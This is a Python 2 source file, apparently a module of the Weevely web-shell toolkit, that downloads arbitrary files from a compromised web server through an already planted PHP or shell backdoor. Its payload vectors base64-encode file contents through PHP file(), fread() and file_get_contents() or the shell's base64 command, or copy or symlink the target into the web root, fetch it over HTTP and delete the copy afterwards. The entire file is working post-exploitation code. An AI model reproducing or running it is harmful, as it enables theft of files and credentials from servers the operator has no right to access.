'''
Created on 24/ago/2011

@author: norby
'''
from core.module import Module, ModuleException
from core.http.request import Request
from base64 import b64decode
from hashlib import md5
from random import randint
from core.vector import VectorList, Vector as V
from core.parameters import ParametersList, Parameter as P

classname = 'Download'
    
class Download(Module):
    '''Download binary/ascii files from target filesystem
    :file.download <remote path> <locale path>
    '''
    
    vectors = VectorList([
        V('shell.php', 'file', "print(@base64_encode(implode('', file('%s'))));"),
        V('shell.php', 'fread', "$f='%s'; print(@base64_encode(fread(fopen($f,'rb'),filesize($f))));"),
        V('shell.php', "file_get_contents", "print(@base64_encode(file_get_contents('%s')));"),
        V('shell.sh',  "base64", "base64 -w 0 %s"),
        V('shell.php', "copy", "copy('compress.zlib://%s','%s') && print(1);"),
        V('shell.php',  "symlink", "symlink('%s','%s') && print(1);")

    ])



    
    params = ParametersList('Download binary/ascii files from target', vectors,
                    P(arg='rpath', help='Remote file path', required=True, pos=0),
                    P(arg='lpath', help='Local file path', required=True, pos=1)
                    )

    
    def __init__(self, modhandler, url, password):
        
        self.encoder_callable = False
        self.md5_callable = False
        
        
        self.payload = None
        self.vector = None
        self.interpreter = None
        self.transfer_dir = None
        self.transfer_url_dir = None
        
        self.lastreadfile = ''
        
        
        Module.__init__(self, modhandler, url, password)

        
    def _probe(self):
        
        if self.modhandler.load('shell.php').run({ 0 : "is_callable('base64_encode') && print('1');" }) == '1':
            self.encoder_callable = True
        else:
            self.mprint('[%s] PHP \'base64_encode\' transfer methods not available.' % self.name)


    def __prepare_payload( self, vector, parameters ):

        if vector.payloads[0].count( '%s' ) == len(parameters):
            return vector.payloads[0] % tuple(parameters)
        else:
            raise ModuleException(self.name,  "Error payload parameter number does not corresponds")

        
    def __execute_payload(self, vector, parameters):
        
        remote_path = parameters[0]

        if (vector.name == 'copy' or vector.name == 'symlink'):
    
            if not (self.transfer_dir and self.transfer_url_dir and self.file_path):
                
                self.modhandler.set_verbosity(6)
                if not self.modhandler.load('find.webdir').run({'rpath': 'find'}):
                    self.modhandler.set_verbosity()
                    return
                self.modhandler.set_verbosity()
               
                self.transfer_url_dir = self.modhandler.load('find.webdir').found_url
                self.transfer_dir = self.modhandler.load('find.webdir').found_dir
                
                if not self.transfer_url_dir or not self.transfer_dir:
                    return
            
                filename = '/' + str(randint(11, 999)) + remote_path.split('/').pop();
                self.file_path = self.transfer_dir + filename
                self.url = self.transfer_url_dir + filename
            
            payload = self.__prepare_payload(vector, [remote_path, self.file_path])
            
        else:
            
            payload = self.__prepare_payload(vector, [remote_path])
            
        response = self.modhandler.load(vector.interpreter).run({0 : payload})
        
        if response:
            
            self.payload = payload
            self.interpreter = vector.interpreter
            self.vector = vector
            
            return response
   
     
     
    def __process_response(self, response, remote_path, local_path):
        
        if self.vector.name == 'copy' or self.vector.name == 'symlink':
            
            if not self.file_path.endswith('.html') and not self.file_path.endswith('.htm'):
                self.mprint("[%s] Warning: vector '%s' works better with files with downloadable extension like '.html'" % (self.name, self.vector.name))
                    
            if self.modhandler.load('file.check').run({'rpath' : self.file_path, 'mode': 'exists'}):
                response = Request(self.url).read()
            else:
                response = None

            # Force deleting. Does not check existance, because broken links returns False
            self.modhandler.load('file.rm').run({'rpath' : self.file_path, 'recursive': False})
            
        else:
            if self.encoder_callable:
                try:
                    response = b64decode(response)
                except TypeError:
                    self.mprint("[!] [%s] Error, unexpected file content" % (self.name))
                    
              
        if response:

            try:
                f = open(local_path,'wb')
                f.write(response)
                f.close()
            except Exception, e:
                self.mprint('[!] [%s] Some error occurred writing local file \'%s\'.' % (self.name, local_path))
                raise ModuleException(self.name, e)
            
    
            response_md5 = md5(response).hexdigest()
            remote_md5 = self.modhandler.load('file.check').run({'rpath' : remote_path, 'mode' : 'md5'})
            
            if not remote_md5:
                self.mprint('[!] [%s] MD5 hash method is not callable with \'%s\', check disabled' % (self.name, remote_path))
                return response
            elif not  remote_md5 == response_md5:
                self.mprint('[%s] MD5 hash of \'%s\' file mismatch, file corrupted' % (self.name, local_path))
            else:
                self.mprint('[%s] File correctly downloaded to \'%s\'.' % (self.name, local_path))
                return response

    def get_last_read_file(self):
        """Get last read file and delete it"""
        if self.lastreadfile:
            lastreadfile = self.lastreadfile[:]
            self.lastreadfile=''
            return lastreadfile
     
    def run_module(self, remote_path, local_path):
    
        vectors = self._get_default_vector2()
        
        
        file_response = None
        if not vectors:
            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
        
        for vector in vectors:
            
            response = self.__execute_payload(vector, [remote_path, local_path])
            
            if response != None:
                    
                file_response = self.__process_response(response, remote_path, local_path)
                
                if file_response:
                    self.params.set_and_check_parameters({'vector' : self.vector.name})
                    self.lastreadfile = file_response     
                    return
                    
                    
        if not file_response:
            raise ModuleException(self.name,  "File read failed")
        
        
            
            
        
